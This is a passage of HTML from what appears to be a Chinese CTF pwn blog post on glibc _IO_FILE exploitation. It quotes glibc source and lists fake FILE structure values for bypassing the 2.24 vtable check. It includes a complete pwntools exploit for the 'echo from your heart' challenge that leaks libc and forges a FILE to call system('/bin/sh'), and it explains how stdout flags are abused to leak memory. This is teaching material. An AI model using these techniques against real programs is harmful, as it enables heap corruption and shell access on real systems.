class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_str_overflow (FILE *fp, int c)</span><br><span class="line">&#123;</span><br><span class="line">  int flush_only = c == EOF;</span><br><span class="line">  size_t pos;</span><br><span class="line">  if (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      return flush_only ? 0 : EOF;</span><br><span class="line">  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */         // step 1</span><br><span class="line">	return EOF;</span><br><span class="line">      else</span><br><span class="line">	&#123;</span><br><span class="line">	  char *new_buf;</span><br><span class="line">	  char *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  size_t old_blen = _IO_blen (fp);</span><br><span class="line">	  size_t new_size = 2 * old_blen + 100;</span><br><span class="line">	  if (new_size &lt; old_blen)</span><br><span class="line">	    return EOF;</span><br><span class="line">	  new_buf = malloc (new_size);</span><br><span class="line">	  if (new_buf == NULL)</span><br><span class="line">	    &#123;</span><br><span class="line">	      /*	  __ferror(fp) = 1; */</span><br><span class="line">	      return EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  if (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">	      free (old_buf);</span><br><span class="line">	      /* Make sure _IO_setb won&apos;t try to delete _IO_buf_base. */</span><br><span class="line">	      fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">	    &#125;</span><br><span class="line">	  memset (new_buf + old_blen, &apos;\0&apos;, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, 1);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;</span><br><span class="line">  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
<p>_IO_str_overflow需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = 0</span><br><span class="line">_IO_write_base = 0</span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1</span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr -100) / 2 </span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure></p>
<h1 id="利用实例2"><a href="#利用实例2" class="headerlink" title="利用实例2"></a>利用实例2</h1><h2 id="echo-from-your-heart"><a href="#echo-from-your-heart" class="headerlink" title="echo from your heart"></a>echo from your heart</h2><h2 id="方向-3"><a href="#方向-3" class="headerlink" title="方向"></a>方向</h2><p>有点迷/尝试使用的fake_file2也没有成功，在unlink的时候就中断了。</p>
<p>_flags = 0<br>_IO_write_base &lt; _IO_write_ptr<br>_IO_buf_base = binsh<br>_mode &lt;= 0<br>vtable = _IO_str_jumps - 8<br>fp+0xe8 -&gt; system_addr</p>
<h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>基本上就是那个hctf中的printf，程序执行流基本一致</p>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">	local = 0</span><br><span class="line">else:</span><br><span class="line">	local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">	sh = process(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">	elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">	libc = ELF(&apos;/glibc/glibc-2.24/debug_x64/lib/libc-2.24.so&apos;)</span><br><span class="line">else:</span><br><span class="line">	sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">	elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">	#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(size,word):</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,str(size))</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,word)</span><br><span class="line"></span><br><span class="line">get(0x20,&quot;%lx.&quot;*8+&quot;%lx&quot;)</span><br><span class="line">sh.recvuntil(&apos;echo: &apos;)</span><br><span class="line">for i in range(8):</span><br><span class="line">    sh.recvuntil(&apos;.&apos;)</span><br><span class="line">#print sh.recv()</span><br><span class="line">libc.base = int(&apos;0x&apos;+sh.recvuntil(&apos;\n&apos;,drop=True),16) - 0x1fcc9</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh = libc.base + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line">io_str_jumps = libc.base + libc.symbols[&apos;_IO_str_jumps&apos;]</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh))</span><br><span class="line">#sh.recv()</span><br><span class="line">get(0x20,&apos;a&apos;*0x20+p64(0)+p64(0xfa1))</span><br><span class="line">get(0x1000,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">fake_file = p64(0)+p64(0x61)</span><br><span class="line">fake_file += p64(0)+p64(io_list_all-0x10)  # read_end &amp; read_base</span><br><span class="line">fake_file += p64(2)+p64(3)                 # write_base &lt; write_ptr</span><br><span class="line">fake_file += p64(0)+p64(binsh)             # write_end &amp; buf_base</span><br><span class="line">fake_file += &apos;\0&apos;*0x98#fake_file.ljust(0xd8,&apos;\0&apos;)  # use ljust will be detected why?</span><br><span class="line"></span><br><span class="line">pay = fake_file </span><br><span class="line">pay += p64(io_str_jumps-8)                 # vtable_ptr</span><br><span class="line">pay += p64(0) + p64(system)</span><br><span class="line"></span><br><span class="line">fake_file2 = p64(0)+p64(0x61)</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64(0)+p64((binsh-100)/2+1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64((binsh-100)/2)           # buf_end</span><br><span class="line">fake_file2 += &apos;\0&apos;*0x60</span><br><span class="line">fake_file2 += p64(2)+p64(3)                # freeres_list &amp; freeres_buf</span><br><span class="line">fake_file2 += p64(0)*0x20</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay2 = fake_file2</span><br><span class="line">pay2 += p64(io_str_jumps-0x18)</span><br><span class="line"></span><br><span class="line">get(0x10,&apos;d&apos; * 0x10 + pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#get(0x20,&apos;a&apos;*0x20+fake_file)</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendlineafter(&apos;word: &apos;,&apos;20&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="利用实例3"><a href="#利用实例3" class="headerlink" title="利用实例3"></a>利用实例3</h1><p>利用 _IO_2_1_stdout_ 泄露信息</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>_flags 标志了FILE的一些行为，对其进行构造可以帮助我们进行泄露</p>
<p>其中高两位字节是_IO_magic<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span><br><span class="line">#define _IO_MAGIC_MASK 0xFFFF0000</span><br></pre></td></tr></table></figure></p>
<p>而低二位字节为比特级的标志位，低位到高位规则如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_USER_BUF 1 /* User owns buffer; don&apos;t delete it on close. */</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 /* Reading not allowed */</span><br><span class="line">#define _IO_NO_WRITES 8 /* Writing not allowd */</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&apos;t call close(_fileno) on cleanup. */</span><br><span class="line">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></table></figure>
<p>因为前面已经分析了源码，这里就不细节分析了，提取相关的需要绕过部分讲解即可。因为是要利用_IO_2_1_stdout_来泄露，所以要修改的也是这个函数。</p>
<p>stdout    的_flags一般是：0x00000000fbad2887，根据标志位对应可以看到是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_MAGIC|_IO_IS_FILEBUF|_IO_CURRENTLY_PUTTING|_IO_LINKED|_IO_NO_READS | _IO_UNBUFFERED |_IO_USER_BUF</span><br></pre></td></tr></table></figure></p>
<p>输出时初始调用_IO_new_file_xsputn函数，该函数调用_IO_new_file_overflow，在这个函数里</p>
<ol>
<li><p>先检查是否有_IO_NO_WRITE标志位，没有的话直接报错退出，所以该位需要为0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    return EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在这里又判断了_IO_CURRENTLY_PUTTING标志位，目的是查看是否需要分配缓冲区，因为一般分配过缓冲区的话该位就是1，所以一般设置为1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     /* Allocate a buffer if needed. */</span><br><span class="line">     if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>然后在即将调用_IO_do_write函数时</p>
<ol start="3">
<li>检查了_IO_UNBUFFERED标志位与_IO_LINE_BUF标志位，不过是或，即二者有一个就可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;))</span><br><span class="line">    if (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>跟进到new_do_write函数后</p>
<ol start="4">
<li>检查了_IO_IS_APPENDING标志位或fp-&gt;_IO_read_end != fp-&gt;_IO_write_base<br>所以令_IO_IS_APPENDING为1或_IO_read_end==_IO_write_base即可，否则的话就没有输出</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    /* On a system without a proper O_APPEND implementation,</span><br><span class="line">       you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">       not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">       Instead, just indicate that offset (before and after) is</span><br><span class="line">       unpredictable. */</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">      if (new_pos == _IO_pos_BAD)</span><br><span class="line">	return 0;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  if (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">      fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;</span><br></pre></td></tr></table></figure>
<p>所以稍微总结下要注意的标志位，利用时也是注意这几个即可</p>
<p>_IO_NO_WRITE = 0<br>_IO_CURRENTLY_PUTTING = 1<br>_IO_UNBUFFERED = 1 || _IO_LINE_BUF = 1          // 这两个好像不需要构造，没有特别理解，挖坑<br>_IO_IS_APPENDING = 1 || _IO_read_end==_IO_write_base</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>2.23 等没有tcache利用unsorted bin在fastbin的chunk的fd指针上覆盖出main_arena附近的地址，然后利用部分地址覆盖对stdout地址进行爆破<br>（一般是半个字节，1/16的概率），然后尝试将fastbin分配到stdout处即可，因为一般的布局来讲，stdout上面是stderr，其中有0x7f开头的地址，通过偏移进行设计即可</p>
<p>2.27 等有tcache的版本，也是利用unsorted bin在tcache的fd上覆盖出main_arena附近的地址，部分地址覆盖完之后尝试将其分配出去即可，因为低版本的tcache很少检查size，所以可能会更方便点。</p>
<h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p><a href="https://siriuswhiter.github.io/2019/07/30/ciscn-2019-%E5%86%B3%E8%B5%9Bpwn/#6" target="_blank" rel="noopener">https://siriuswhiter.github.io/2019/07/30/ciscn-2019-%E5%86%B3%E8%B5%9Bpwn/#6</a></p>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2019-09-28T09:22:53.410Z" itemprop="dateUpdated">2019-09-28 17:22:53</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2019/07/09/io-file-利用方法/" target="_blank" rel="external">http://siriuswhiter.tk/2019/07/09/io-file-利用方法/</a>
        
    </div>
    <footer>
        <a href="http://siriuswhiter.tk">
            <img src="/img/avatar.jpg" alt="Sirius Whiter">
            Sirius Whiter
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/file/">file</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/07/09/io-file-利用方法/&title=《_IO_FILE 利用方法》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/07/09/io-file-利用方法/&title=《_IO_FILE 利用方法》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2019/07/13/arm-pwn-环境搭建及示例/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Arm-pwn 环境搭建及示例</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/07/08/io-file-源码分析/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">_IO_FILE 源码分析</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前置知识"><span class="post-toc-number">1.</span> <span class="post-toc-text">前置知识</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IO-FILE-结构体"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">IO_FILE 结构体</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#偏移记录"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">偏移记录</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IO-jump-t表结构"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">IO_jump_t表结构</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#常用对应iofile函数"><span class="post-toc-number">1.0.4.</span> <span class="post-toc-text">常用对应iofile函数</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用思路"><span class="post-toc-number">2.</span> <span class="post-toc-text">利用思路</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用演示"><span class="post-toc-number">3.</span> <span class="post-toc-text">利用演示</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用实例"><span class="post-toc-number">4.</span> <span class="post-toc-text">利用实例</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#task-challenge1"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">task_challenge1</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方向"><span class="post-toc-number">4.1.1.</span> <span class="post-toc-text">方向</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#题目"><span class="post-toc-number">4.1.2.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-number">4.1.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#house-of-orange"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">house of orange</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方向-1"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">方向</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#题目-1"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路"><span class="post-toc-number">4.2.3.</span> <span class="post-toc-text">思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">4.2.4.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ciscn-2019-n-7"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">ciscn_2019_n_7</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#题目-2"><span class="post-toc-number">4.3.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方向-2"><span class="post-toc-number">4.3.2.</span> <span class="post-toc-text">方向</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp-2"><span class="post-toc-number">4.3.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2-24-check-绕过"><span class="post-toc-number">5.</span> <span class="post-toc-text">2.24 check 绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#IO-buf-base-amp-IO-buf-end"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">_IO_buf_base &amp; _IO_buf_end</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#IO-str-jumps"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">_IO_str_jumps</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用实例2"><span class="post-toc-number">6.</span> <span class="post-toc-text">利用实例2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#echo-from-your-heart"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">echo from your heart</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#方向-3"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">方向</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-3"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-3"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用实例3"><span class="post-toc-number">7.</span> <span class="post-toc-text">利用实例3</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-4"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">题目</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        请我喝奶茶呀
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    
</div>

        <footer class="footer">
    
    <div class="top">
        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Sirius Whiter &copy; 2018 - 2020
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/07/09/io-file-利用方法/&title=《_IO_FILE 利用方法》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
